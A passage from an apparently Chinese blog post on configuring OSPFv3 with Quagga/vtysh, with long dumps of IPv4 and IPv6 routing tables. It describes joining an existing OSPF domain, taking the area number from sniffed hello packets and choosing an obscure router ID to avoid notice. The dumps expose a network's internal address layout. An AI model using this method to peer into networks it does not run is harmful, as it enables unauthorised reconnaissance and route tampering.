eth0, 00:00:14</div><div class="line">O&gt;* 10.10.10.136/29 [110/1] via 10.211.7.254, eth0, 00:00:14</div><div class="line">O&gt;* 10.10.10.152/29 [110/1] via 10.211.7.254, eth0, 00:00:14</div><div class="line">O&gt;* 10.10.10.168/30 [110/12] via 10.211.7.254, eth0, 00:00:15</div><div class="line">O&gt;* 10.10.10.176/29 [110/1] via 10.211.7.254, eth0, 00:00:14</div><div class="line">O&gt;* 10.10.10.184/30 [110/13] via 10.211.7.254, eth0, 00:00:15</div><div class="line">O&gt;* 10.10.10.188/30 [110/13] via 10.211.7.254, eth0, 00:00:15</div><div class="line">O&gt;* 10.10.10.200/30 [110/12] via 10.211.7.254, eth0, 00:00:15</div><div class="line">O&gt;* 10.10.10.208/28 [110/1] via 10.211.7.254, eth0, 00:00:14</div><div class="line">O&gt;* 10.10.10.240/28 [110/1] via 10.211.7.254, eth0, 00:00:14</div><div class="line">O&gt;* 10.200.0.0/16 [110/20] via 10.211.7.254, eth0, 00:00:14</div><div class="line">O&gt;* 10.201.0.0/17 [110/14] via 10.211.7.254, eth0, 00:00:15</div><div class="line">O&gt;* 10.201.128.0/17 [110/14] via 10.211.7.254, eth0, 00:00:15</div><div class="line">O&gt;* 10.202.0.0/19 [110/13] via 10.211.7.254, eth0, 00:00:15</div><div class="line">O&gt;* 10.202.32.0/19 [110/13] via 10.211.7.254, eth0, 00:00:15</div><div class="line">O&gt;* 10.202.64.0/19 [110/13] via 10.211.7.254, eth0, 00:00:15</div><div class="line">O&gt;* 10.202.128.0/19 [110/13] via 10.211.7.254, eth0, 00:00:15</div><div class="line">O&gt;* 10.202.160.0/19 [110/13] via 10.211.7.254, eth0, 00:00:15</div><div class="line">O&gt;* 10.203.0.0/19 [110/13] via 10.211.7.254, eth0, 00:00:15</div><div class="line">O&gt;* 10.203.128.0/19 [110/13] via 10.211.7.254, eth0, 00:00:15</div><div class="line">O&gt;* 10.203.160.0/19 [110/13] via 10.211.7.254, eth0, 00:00:15</div><div class="line">O&gt;* 10.204.0.0/17 [110/14] via 10.211.7.254, eth0, 00:00:15</div><div class="line">O&gt;* 10.205.0.0/21 [110/20] via 10.211.7.254, eth0, 00:00:14</div><div class="line">O&gt;* 10.210.0.0/16 [110/13] via 10.211.7.254, eth0, 00:00:15</div><div class="line">O   10.211.0.0/21 [110/10] is directly connected, eth0, 00:00:51</div><div class="line">C&gt;* 10.211.0.0/21 is directly connected, eth0</div><div class="line">O&gt;* 10.211.8.0/21 [110/13] via 10.211.7.254, eth0, 00:00:15</div><div class="line">O&gt;* 10.211.16.0/21 [110/13] via 10.211.7.254, eth0, 00:00:15</div><div class="line">O&gt;* 10.211.24.0/21 [110/13] via 10.211.7.254, eth0, 00:00:15</div><div class="line">O&gt;* 10.211.40.0/21 [110/14] via 10.211.7.254, eth0, 00:00:15</div><div class="line">O&gt;* 10.211.48.0/21 [110/14] via 10.211.7.254, eth0, 00:00:15</div><div class="line">O&gt;* 121.195.186.0/28 [110/20] via 10.211.7.254, eth0, 00:00:14</div><div class="line">O&gt;* 121.195.186.32/27 [110/1] via 10.211.7.254, eth0, 00:00:14</div><div class="line">O&gt;* 121.195.186.64/26 [110/13] via 10.211.7.254, eth0, 00:00:15</div><div class="line">O&gt;* 121.195.186.128/25 [110/1] via 10.211.7.254, eth0, 00:00:14</div><div class="line">O&gt;* 124.16.64.0/24 [110/13] via 10.211.7.254, eth0, 00:00:15</div><div class="line">O&gt;* 124.16.65.0/24 [110/13] via 10.211.7.254, eth0, 00:00:15</div><div class="line">O&gt;* 124.16.66.0/24 [110/13] via 10.211.7.254, eth0, 00:00:15</div><div class="line">O&gt;* 124.16.67.0/24 [110/13] via 10.211.7.254, eth0, 00:00:15</div><div class="line">O&gt;* 124.16.68.0/23 [110/13] via 10.211.7.254, eth0, 00:00:15</div><div class="line">O&gt;* 124.16.70.0/23 [110/13] via 10.211.7.254, eth0, 00:00:15</div><div class="line">O&gt;* 124.16.72.0/24 [110/13] via 10.211.7.254, eth0, 00:00:15</div><div class="line">O&gt;* 124.16.73.0/24 [110/13] via 10.211.7.254, eth0, 00:00:15</div><div class="line">O&gt;* 124.16.74.0/24 [110/20] via 10.211.7.254, eth0, 00:00:14</div><div class="line">O&gt;* 124.16.75.0/24 [110/1] via 10.211.7.254, eth0, 00:00:14</div><div class="line">O&gt;* 124.16.75.11/32 [110/1] via 10.211.7.254, eth0, 00:00:14</div><div class="line">O&gt;* 124.16.98.0/24 [110/14] via 10.211.7.254, eth0, 00:00:15</div><div class="line">O&gt;* 124.16.99.0/24 [110/14] via 10.211.7.254, eth0, 00:00:15</div><div class="line">O&gt;* 124.16.100.0/23 [110/14] via 10.211.7.254, eth0, 00:00:15</div><div class="line">O&gt;* 124.16.102.0/23 [110/14] via 10.211.7.254, eth0, 00:00:15</div><div class="line">O&gt;* 124.16.104.0/23 [110/14] via 10.211.7.254, eth0, 00:00:15</div><div class="line">O&gt;* 124.16.106.0/23 [110/14] via 10.211.7.254, eth0, 00:00:15</div><div class="line">O&gt;* 124.16.108.0/22 [110/14] via 10.211.7.254, eth0, 00:00:15</div><div class="line">O&gt;* 124.16.112.0/22 [110/14] via 10.211.7.254, eth0, 00:00:15</div><div class="line">O&gt;* 124.16.116.0/22 [110/14] via 10.211.7.254, eth0, 00:00:15</div><div class="line">O&gt;* 124.16.120.0/24 [110/14] via 10.211.7.254, eth0, 00:00:15</div><div class="line">C&gt;* 127.0.0.0/8 is directly connected, lo</div><div class="line">K&gt;* 169.254.0.0/16 is directly connected, eth1</div><div class="line">O&gt;* 172.16.4.0/22 [110/20] via 10.211.7.254, eth0, 00:00:14</div><div class="line">O&gt;* 172.16.8.0/24 [110/20] via 10.211.7.254, eth0, 00:00:14</div><div class="line">O&gt;* 172.16.9.0/24 [110/20] via 10.211.7.254, eth0, 00:00:14</div><div class="line">O&gt;* 172.16.10.0/24 [110/20] via 10.211.7.254, eth0, 00:00:14</div><div class="line">O&gt;* 172.16.11.0/24 [110/20] via 10.211.7.254, eth0, 00:00:14</div><div class="line">O&gt;* 172.16.13.0/24 [110/20] via 10.211.7.254, eth0, 00:00:14</div><div class="line">O&gt;* 172.16.14.0/24 [110/20] via 10.211.7.254, eth0, 00:00:14</div><div class="line">O&gt;* 172.16.32.0/24 [110/20] via 10.211.7.254, eth0, 00:00:14</div><div class="line">O&gt;* 172.16.33.0/24 [110/20] via 10.211.7.254, eth0, 00:00:14</div><div class="line">O&gt;* 172.16.35.0/24 [110/20] via 10.211.7.254, eth0, 00:00:14</div><div class="line">O&gt;* 172.16.40.0/22 [110/20] via 10.211.7.254, eth0, 00:00:14</div><div class="line">O&gt;* 172.31.216.0/23 [110/20] via 10.211.7.254, eth0, 00:00:14</div><div class="line">O&gt;* 192.168.10.0/24 [110/13] via 10.211.7.254, eth0, 00:00:15</div><div class="line">O&gt;* 192.168.11.0/24 [110/13] via 10.211.7.254, eth0, 00:00:15</div><div class="line">O&gt;* 192.168.12.0/24 [110/13] via 10.211.7.254, eth0, 00:00:15</div><div class="line">O&gt;* 192.168.13.0/24 [110/13] via 10.211.7.254, eth0, 00:00:15</div><div class="line">O&gt;* 192.168.14.0/24 [110/20] via 10.211.7.254, eth0, 00:00:14</div><div class="line">O&gt;* 192.168.15.0/24 [110/14] via 10.211.7.254, eth0, 00:00:15</div><div class="line">O&gt;* 192.168.16.0/24 [110/20] via 10.211.7.254, eth0, 00:00:14</div><div class="line">O&gt;* 192.168.17.0/24 [110/13] via 10.211.7.254, eth0, 00:00:15</div><div class="line">O&gt;* 192.168.18.0/24 [110/13] via 10.211.7.254, eth0, 00:00:15</div><div class="line">O&gt;* 192.168.19.0/24 [110/13] via 10.211.7.254, eth0, 00:00:15</div><div class="line">O&gt;* 192.168.20.0/24 [110/13] via 10.211.7.254, eth0, 00:00:15</div><div class="line">O&gt;* 192.168.21.0/24 [110/13] via 10.211.7.254, eth0, 00:00:15</div><div class="line">O&gt;* 192.168.22.0/24 [110/13] via 10.211.7.254, eth0, 00:00:15</div><div class="line">O&gt;* 192.168.23.0/24 [110/13] via 10.211.7.254, eth0, 00:00:15</div><div class="line">O&gt;* 192.168.24.0/24 [110/13] via 10.211.7.254, eth0, 00:00:15</div><div class="line">O&gt;* 192.168.25.0/24 [110/11] via 10.211.7.254, eth0, 00:00:15</div><div class="line">O&gt;* 192.168.26.0/24 [110/13] via 10.211.7.254, eth0, 00:00:15</div><div class="line">O&gt;* 192.168.27.0/24 [110/13] via 10.211.7.254, eth0, 00:00:15</div><div class="line">O&gt;* 192.168.28.0/24 [110/13] via 10.211.7.254, eth0, 00:00:15</div><div class="line">O&gt;* 192.168.29.0/24 [110/13] via 10.211.7.254, eth0, 00:00:15</div><div class="line">O&gt;* 192.168.32.0/24 [110/12] via 10.211.7.254, eth0, 00:00:15</div><div class="line">O&gt;* 192.168.33.0/24 [110/13] via 10.211.7.254, eth0, 00:00:15</div><div class="line">O&gt;* 192.168.34.0/24 [110/1] via 10.211.7.254, eth0, 00:00:14</div><div class="line">O&gt;* 192.168.35.0/24 [110/1] via 10.211.7.254, eth0, 00:00:14</div><div class="line">O&gt;* 192.168.38.0/24 [110/14] via 10.211.7.254, eth0, 00:00:15</div><div class="line">O&gt;* 192.168.50.0/24 [110/1] via 10.211.7.254, eth0, 00:00:14</div><div class="line">O&gt;* 192.168.63.0/30 [110/13] via 10.211.7.254, eth0, 00:00:15</div><div class="line">O&gt;* 192.168.63.4/30 [110/13] via 10.211.7.254, eth0, 00:00:15</div><div class="line">O&gt;* 192.168.63.8/30 [110/13] via 10.211.7.254, eth0, 00:00:15</div><div class="line">O&gt;* 192.168.63.12/30 [110/13] via 10.211.7.254, eth0, 00:00:15</div><div class="line">O&gt;* 192.168.63.16/30 [110/13] via 10.211.7.254, eth0, 00:00:15</div><div class="line">O&gt;* 192.168.63.20/30 [110/13] via 10.211.7.254, eth0, 00:00:15</div><div class="line">O&gt;* 192.168.63.24/30 [110/13] via 10.211.7.254, eth0, 00:00:15</div><div class="line">O&gt;* 192.168.63.28/30 [110/13] via 10.211.7.254, eth0, 00:00:15</div><div class="line">O&gt;* 192.168.63.32/29 [110/13] via 10.211.7.254, eth0, 00:00:15</div><div class="line">O&gt;* 192.168.64.0/24 [110/20] via 10.211.7.254, eth0, 00:00:14</div><div class="line">O&gt;* 192.168.64.0/28 [110/12] via 10.211.7.254, eth0, 00:00:15</div><div class="line">O&gt;* 192.168.65.0/24 [110/20] via 10.211.7.254, eth0, 00:00:14</div><div class="line">O&gt;* 192.168.67.0/24 [110/14] via 10.211.7.254, eth0, 00:00:15</div><div class="line">O&gt;* 192.168.68.0/24 [110/14] via 10.211.7.254, eth0, 00:00:15</div><div class="line">O&gt;* 192.168.69.0/24 [110/14] via 10.211.7.254, eth0, 00:00:15</div><div class="line">O&gt;* 192.168.70.0/24 [110/14] via 10.211.7.254, eth0, 00:00:15</div><div class="line">O&gt;* 192.168.72.0/24 [110/14] via 10.211.7.254, eth0, 00:00:15</div><div class="line">O&gt;* 192.168.73.0/24 [110/14] via 10.211.7.254, eth0, 00:00:15</div><div class="line">O&gt;* 192.168.74.0/24 [110/14] via 10.211.7.254, eth0, 00:00:15</div><div class="line">O&gt;* 192.168.75.0/24 [110/14] via 10.211.7.254, eth0, 00:00:15</div><div class="line">C&gt;* 192.168.86.0/24 is directly connected, eth1</div><div class="line">O&gt;* 192.168.94.0/24 [110/14] via 10.211.7.254, eth0, 00:00:15</div><div class="line">O&gt;* 192.168.96.0/24 [110/14] via 10.211.7.254, eth0, 00:00:15</div><div class="line">O&gt;* 192.168.126.0/24 [110/13] via 10.211.7.254, eth0, 00:00:15</div><div class="line">O&gt;* 192.168.127.0/24 [110/13] via 10.211.7.254, eth0, 00:00:15</div><div class="line">O&gt;* 192.168.128.0/24 [110/13] via 10.211.7.254, eth0, 00:00:15</div><div class="line">O&gt;* 192.168.200.0/24 [110/13] via 10.211.7.254, eth0, 00:00:15</div><div class="line">O&gt;* 192.168.201.0/24 [110/13] via 10.211.7.254, eth0, 00:00:15</div><div class="line">O&gt;* 192.168.202.0/24 [110/13] via 10.211.7.254, eth0, 00:00:15</div><div class="line">O&gt;* 192.168.203.0/24 [110/13] via 10.211.7.254, eth0, 00:00:15</div><div class="line">O&gt;* 192.168.204.0/24 [110/13] via 10.211.7.254, eth0, 00:00:15</div><div class="line">O&gt;* 192.168.249.0/24 [110/13] via 10.211.7.254, eth0, 00:00:15</div><div class="line">O&gt;* 192.168.250.0/24 [110/13] via 10.211.7.254, eth0, 00:00:15</div><div class="line">O&gt;* 192.168.252.0/30 [110/13] via 10.211.7.254, eth0, 00:00:15</div><div class="line">O&gt;* 192.168.252.4/30 [110/13] via 10.211.7.254, eth0, 00:00:15</div><div class="line">O&gt;* 192.168.252.8/30 [110/13] via 10.211.7.254, eth0, 00:00:15</div><div class="line">O&gt;* 192.168.252.12/30 [110/13] via 10.211.7.254, eth0, 00:00:15</div><div class="line">O&gt;* 192.168.252.16/30 [110/13] via 10.211.7.254, eth0, 00:00:15</div><div class="line">O&gt;* 192.168.253.0/30 [110/13] via 10.211.7.254, eth0, 00:00:15</div><div class="line">O&gt;* 192.168.253.4/30 [110/13] via 10.211.7.254, eth0, 00:00:15</div><div class="line">O&gt;* 192.168.253.8/30 [110/13] via 10.211.7.254, eth0, 00:00:15</div><div class="line">O&gt;* 210.76.192.0/22 [110/13] via 10.211.7.254, eth0, 00:00:15</div><div class="line">O&gt;* 210.76.196.0/24 [110/13] via 10.211.7.254, eth0, 00:00:15</div><div class="line">O&gt;* 210.76.196.0/25 [110/20] via 10.211.7.254, eth0, 00:00:14</div><div class="line">O&gt;* 210.76.196.128/25 [110/20] via 10.211.7.254, eth0, 00:00:14</div><div class="line">O&gt;* 210.76.197.0/24 [110/13] via 10.211.7.254, eth0, 00:00:15</div><div class="line">O&gt;* 210.76.198.0/23 [110/13] via 10.211.7.254, eth0, 00:00:15</div><div class="line">O&gt;* 210.76.200.0/23 [110/13] via 10.211.7.254, eth0, 00:00:15</div><div class="line">O&gt;* 210.76.202.0/24 [110/13] via 10.211.7.254, eth0, 00:00:15</div><div class="line">O&gt;* 210.76.203.0/25 [110/20] via 10.211.7.254, eth0, 00:00:14</div><div class="line">O&gt;* 210.76.203.128/26 [110/20] via 10.211.7.254, eth0, 00:00:14</div><div class="line">O&gt;* 210.76.204.0/25 [110/13] via 10.211.7.254, eth0, 00:00:15</div><div class="line">O&gt;* 210.76.204.128/25 [110/13] via 10.211.7.254, eth0, 00:00:15</div><div class="line">O&gt;* 210.76.205.0/24 [110/13] via 10.211.7.254, eth0, 00:00:15</div><div class="line">O&gt;* 210.76.206.0/23 [110/13] via 10.211.7.254, eth0, 00:00:15</div><div class="line">O&gt;* 210.76.208.0/24 [110/13] via 10.211.7.254, eth0, 00:00:15</div><div class="line">O&gt;* 210.76.210.0/24 [110/13] via 10.211.7.254, eth0, 00:00:15</div><div class="line">O&gt;* 210.76.211.0/24 [110/20] via 10.211.7.254, eth0, 00:00:14</div><div class="line">O&gt;* 210.76.212.0/22 [110/13] via 10.211.7.254, eth0, 00:00:15</div><div class="line">O&gt;* 210.76.216.0/22 [110/13] via 10.211.7.254, eth0, 00:00:15</div><div class="line">O&gt;* 210.77.0.0/24 [110/20] via 10.211.7.254, eth0, 00:00:14</div><div class="line">O&gt;* 210.77.0.0/27 [110/1] via 10.211.7.254, eth0, 00:00:14</div><div class="line">O&gt;* 210.77.0.32/27 [110/13] via 10.211.7.254, eth0, 00:00:15</div><div class="line">O&gt;* 210.77.0.128/25 [110/13] via 10.211.7.254, eth0, 00:00:15</div><div class="line">O&gt;* 210.77.1.0/24 [110/13] via 10.211.7.254, eth0, 00:00:15</div><div class="line">O&gt;* 210.77.2.0/23 [110/13] via 10.211.7.254, eth0, 00:00:15</div><div class="line">O&gt;* 210.77.4.0/22 [110/13] via 10.211.7.254, eth0, 00:00:15</div><div class="line">O&gt;* 210.77.8.0/22 [110/13] via 10.211.7.254, eth0, 00:00:15</div><div class="line">O&gt;* 210.77.12.0/23 [110/13] via 10.211.7.254, eth0, 00:00:15</div><div class="line">O&gt;* 210.77.14.0/24 [110/13] via 10.211.7.254, eth0, 00:00:15</div><div class="line">O&gt;* 210.77.15.0/24 [110/13] via 10.211.7.254, eth0, 00:00:15</div><div class="line">O&gt;* 210.77.16.0/25 [110/12] via 10.211.7.254, eth0, 00:00:15</div><div class="line">O&gt;* 210.77.16.128/25 [110/13] via 10.211.7.254, eth0, 00:00:15</div><div class="line">O&gt;* 210.77.17.0/24 [110/13] via 10.211.7.254, eth0, 00:00:15</div><div class="line">O&gt;* 210.77.18.0/24 [110/13] via 10.211.7.254, eth0, 00:00:15</div><div class="line">O&gt;* 210.77.19.0/24 [110/13] via 10.211.7.254, eth0, 00:00:15</div><div class="line">O&gt;* 210.77.20.0/24 [110/13] via 10.211.7.254, eth0, 00:00:15</div><div class="line">O&gt;* 210.77.21.0/24 [110/20] via 10.211.7.254, eth0, 00:00:14</div><div class="line">O&gt;* 210.77.22.0/23 [110/13] via 10.211.7.254, eth0, 00:00:15</div><div class="line">O&gt;* 210.77.24.0/23 [110/13] via 10.211.7.254, eth0, 00:00:15</div><div class="line">O&gt;* 210.77.26.0/23 [110/13] via 10.211.7.254, eth0, 00:00:15</div><div class="line">O&gt;* 210.77.28.0/24 [110/13] via 10.211.7.254, eth0, 00:00:15</div><div class="line">O&gt;* 210.77.29.0/25 [110/13] via 10.211.7.254, eth0, 00:00:15</div><div class="line">O&gt;* 210.77.29.128/25 [110/13] via 10.211.7.254, eth0, 00:00:15</div><div class="line">O&gt;* 210.77.30.0/26 [110/13] via 10.211.7.254, eth0, 00:00:15</div><div class="line">O&gt;* 210.77.30.64/26 [110/20] via 10.211.7.254, eth0, 00:00:14</div><div class="line">O&gt;* 210.77.30.128/25 [110/13] via 10.211.7.254, eth0, 00:00:15</div><div class="line">O&gt;* 210.77.31.0/24 [110/20] via 10.211.7.254, eth0, 00:00:14</div></pre></td></tr></table></figure>
-<h4 id="配置OSPFv3"><a href="#配置OSPFv3" class="headerlink" title="配置OSPFv3"></a>配置OSPFv3</h4><p>输入路由配置模式</p>
-<figure class="highlight markdown"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">vtysh</div><div class="line">hostname# configure terminal</div><div class="line">hostname(config)# router ospf6</div></pre></td></tr></table></figure>
-<p>配置路由id，应该选择一些比较冷僻的路由ID，避免和整个网络中其他OSPF路由ID重复，这里为2.2.2.179</p>
-<figure class="highlight markdown"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">hostname(config-router)# router-id 2.2.2.179</div></pre></td></tr></table></figure>
-<p>添加在OSPFv3中的网络，area必须为x.x.x.x这种格式，否则会报错。area信息获取同样从抓取的hello包中获知。</p>
-<figure class="highlight markdown"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">hostname(config-router)# interface eth0 area 0.0.0.4</div><div class="line">hostname(config-router)# do write</div></pre></td></tr></table></figure>
-<p>查看邻居关系，若结果有邻居关系且为full，说明建立了邻居关系</p>
-<figure class="highlight markdown"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">Vigilante# show ipv6  ospf6  neighbor  </div><div class="line">Neighbor ID     Pri    DeadTime  State/IfState         Duration I/F[State]</div><div class="line">2.2.2.26              1    00:00:37   Full/DR              00:09:23 eth2[DROther]</div></pre></td></tr></table></figure>
-<p>邻居关系为Full时候，则可以查看路由表了</p>
-<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div></pre></td><td class="code"><pre><div class="line">Vigilante# sh ipv6  route</div><div class="line">Codes: K - kernel route, C - connected, S - static, R - RIPng, O - OSPFv3,</div><div class="line">       I - ISIS, B - BGP, * - FIB route.</div><div class="line"></div><div class="line">O&gt;* ::/0 [110/20] via fe80::7625:8aff:fe0e:b250, eth0, 00:01:09</div><div class="line">C&gt;* ::1/128 is directly connected, lo</div><div class="line">O&gt;* 2001:cc0:2020:1::/64 [110/3] via fe80::7625:8aff:fe0e:b250, eth0, 00:01:09</div><div class="line">O&gt;* 2001:cc0:2020:1003::/64 [110/4] via fe80::7625:8aff:fe0e:b250, eth0, 00:01:09</div><div class="line">O&gt;* 2001:cc0:2020:1004::/64 [110/4] via fe80::7625:8aff:fe0e:b250, eth0, 00:01:09</div><div class="line">O&gt;* 2001:cc0:2020:1005::/64 [110/4] via fe80::7625:8aff:fe0e:b250, eth0, 00:01:09</div><div class="line">O&gt;* 2001:cc0:2020:1006::/64 [110/20] via fe80::7625:8aff:fe0e:b250, eth0, 00:01:09</div><div class="line">O&gt;* 2001:cc0:2020:1007::/64 [110/20] via fe80::7625:8aff:fe0e:b250, eth0, 00:01:09</div><div class="line">O&gt;* 2001:cc0:2020:1008::/64 [110/20] via fe80::7625:8aff:fe0e:b250, eth0, 00:01:09</div><div class="line">O&gt;* 2001:cc0:2020:1010::/64 [110/4] via fe80::7625:8aff:fe0e:b250, eth0, 00:01:09</div><div class="line">O&gt;* 2001:cc0:2020:1032::/64 [110/4] via fe80::7625:8aff:fe0e:b250, eth0, 00:01:09</div><div class="line">O&gt;* 2001:cc0:2020:1033::/64 [110/4] via fe80::7625:8aff:fe0e:b250, eth0, 00:01:09</div><div class="line">O&gt;* 2001:cc0:2020:1034::/64 [110/5] via fe80::7625:8aff:fe0e:b250, eth0, 00:01:09</div><div class="line">O&gt;* 2001:cc0:2020:1035::/64 [110/4] via fe80::7625:8aff:fe0e:b250, eth0, 00:01:09</div><div class="line">O&gt;* 2001:cc0:2020:2000::/64 [110/20] via fe80::7625:8aff:fe0e:b250, eth0, 00:01:09</div><div class="line">O&gt;* 2001:cc0:2020:2010::/64 [110/4] via fe80::7625:8aff:fe0e:b250, eth0, 00:01:09</div><div class="line">O&gt;* 2001:cc0:2020:2011::/64 [110/4] via fe80::7625:8aff:fe0e:b250, eth0, 00:01:09</div><div class="line">O&gt;* 2001:cc0:2020:2012::/64 [110/4] via fe80::7625:8aff:fe0e:b250, eth0, 00:01:09</div><div class="line">O&gt;* 2001:cc0:2020:2013::/64 [110/4] via fe80::7625:8aff:fe0e:b250, eth0, 00:01:09</div><div class="line">O&gt;* 2001:cc0:2020:2014::/64 [110/4] via fe80::7625:8aff:fe0e:b250, eth0, 00:01:09</div><div class="line">O&gt;* 2001:cc0:2020:2015::/64 [110/4] via fe80::7625:8aff:fe0e:b250, eth0, 00:01:09</div><div class="line">O&gt;* 2001:cc0:2020:2016::/64 [110/4] via fe80::7625:8aff:fe0e:b250, eth0, 00:01:09</div><div class="line">O&gt;* 2001:cc0:2020:2017::/64 [110/5] via fe80::7625:8aff:fe0e:b250, eth0, 00:01:09</div><div class="line">O&gt;* 2001:cc0:2020:2018::/64 [110/5] via fe80::7625:8aff:fe0e:b250, eth0, 00:01:09</div><div class="line">O&gt;* 2001:cc0:2020:2020::/64 [110/4] via fe80::7625:8aff:fe0e:b250, eth0, 00:01:09</div><div class="line">O&gt;* 2001:cc0:2020:2021::/64 [110/4] via fe80::7625:8aff:fe0e:b250, eth0, 00:01:09</div><div class="line">O&gt;* 2001:cc0:2020:2022::/64 [110/4] via fe80::7625:8aff:fe0e:b250, eth0, 00:01:09</div><div class="line">O&gt;* 2001:cc0:2020:2030::/64 [110/4] via fe80::7625:8aff:fe0e:b250, eth0, 00:01:09</div><div class="line">O&gt;* 2001:cc0:2020:3001::/64 [110/4] via fe80::7625:8aff:fe0e:b250, eth0, 00:01:09</div><div class="line">O&gt;* 2001:cc0:2020:3002::/64 [110/4] via fe80::7625:8aff:fe0e:b250, eth0, 00:01:09</div><div class="line">O&gt;* 2001:cc0:2020:3003::/64 [110/4] via fe80::7625:8aff:fe0e:b250, eth0, 00:01:09</div><div class="line">O&gt;* 2001:cc0:2020:4001::/64 [110/4] via fe80::7625:8aff:fe0e:b250, eth0, 00:01:09</div><div class="line">O&gt;* 2001:cc0:2020:4002::/64 [110/4] via fe80::7625:8aff:fe0e:b250, eth0, 00:01:09</div><div class="line">O&gt;* 2001:cc0:2020:4004::/64 [110/4] via fe80::7625:8aff:fe0e:b250, eth0, 00:01:09</div><div class="line">O&gt;* 2001:cc0:2020:4005::/64 [110/4] via fe80::7625:8aff:fe0e:b250, eth0, 00:01:09</div><div class="line">O&gt;* 2001:cc0:2020:4006::/64 [110/4] via fe80::7625:8aff:fe0e:b250, eth0, 00:01:09</div><div class="line">O&gt;* 2001:cc0:2020:4007::/64 [110/4] via fe80::7625:8aff:fe0e:b250, eth0, 00:01:09</div><div class="line">O   2001:cc0:2020:4008::/64 [110/1] is directly connected, eth0, 00:01:13</div><div class="line">C&gt;* 2001:cc0:2020:4008::/64 is directly connected, eth0</div><div class="line">O&gt;* 2001:cc0:2020:4009::/64 [110/4] via fe80::7625:8aff:fe0e:b250, eth0, 00:01:09</div><div class="line">O&gt;* 2001:cc0:2020:4010::/64 [110/4] via fe80::7625:8aff:fe0e:b250, eth0, 00:01:09</div><div class="line">O&gt;* 2001:cc0:2020:4012::/64 [110/4] via fe80::7625:8aff:fe0e:b250, eth0, 00:01:09</div><div class="line">O&gt;* 2001:cc0:2020:4013::/64 [110/20] via fe80::7625:8aff:fe0e:b250, eth0, 00:01:09</div><div class="line">O&gt;* 2001:cc0:2020:4014::/64 [110/1] via fe80::7625:8aff:fe0e:b250, eth0, 00:01:09</div><div class="line">O&gt;* 2001:cc0:2020:4015:1::/80 [110/3] via fe80::7625:8aff:fe0e:b250, eth0, 00:01:09</div><div class="line">O&gt;* 2001:cc0:2020:4015:2::/80 [110/3] via fe80::7625:8aff:fe0e:b250, eth0, 00:01:09</div><div class="line">O&gt;* 2001:cc0:2020:4015:3::/80 [110/3] via fe80::7625:8aff:fe0e:b250, eth0, 00:01:09</div><div class="line">O&gt;* 2001:cc0:2020:4015:4::/80 [110/3] via fe80::7625:8aff:fe0e:b250, eth0, 00:01:09</div><div class="line">O&gt;* 2001:cc0:2020:4015:5::/80 [110/3] via fe80::7625:8aff:fe0e:b250, eth0, 00:01:09</div><div class="line">O&gt;* 2001:cc0:2020:4015:6::/80 [110/3] via fe80::7625:8aff:fe0e:b250, eth0, 00:01:09</div><div class="line">O&gt;* 2001:cc0:2020:4015:7::/80 [110/3] via fe80::7625:8aff:fe0e:b250, eth0, 00:01:09</div><div class="line">O&gt;* 2001:cc0:2020:4015:8::/80 [110/3] via fe80::7625:8aff:fe0e:b250, eth0, 00:01:09</div><div class="line">O&gt;* 2001:cc0:2020:4015:9::/80 [110/2] via fe80::7625:8aff:fe0e:b250, eth0, 00:01:09</div><div class="line">O&gt;* 2001:cc0:2020:4015:10::/80 [110/3] via fe80::7625:8aff:fe0e:b250, eth0, 00:01:09</div><div class="line">O&gt;* 2001:cc0:2020:4015:11::/80 [110/3] via fe80::7625:8aff:fe0e:b250, eth0, 00:01:09</div><div class="line">O&gt;* 2001:cc0:2020:4015:12::/80 [110/3] via fe80::7625:8aff:fe0e:b250, eth0, 00:01:09</div><div class="line">O&gt;* 2001:cc0:2020:4015:13::/80 [110/3] via fe80::7625:8aff:fe0e:b250, eth0, 00:01:09</div><div class="line">O&gt;* 2001:cc0:2020:4015:14::/80 [110/3] via fe80::7625:8aff:fe0e:b250, eth0, 00:01:09</div><div class="line">O&gt;* 2001:cc0:2020:4015:15::/80 [110/3] via fe80::7625:8aff:fe0e:b250, eth0, 00:01:09</div><div class="line">O&gt;* 2001:cc0:2020:4015:16::/80 [110/3] via fe80::7625:8aff:fe0e:b250, eth0, 00:01:09</div><div class="line">O&gt;* 2001:cc0:2020:4015:17::/80 [110/3] via fe80::7625:8aff:fe0e:b250, eth0, 00:01:09</div><div class="line">O&gt;* 2001:cc0:2020:4015:20::/80 [110/4] via 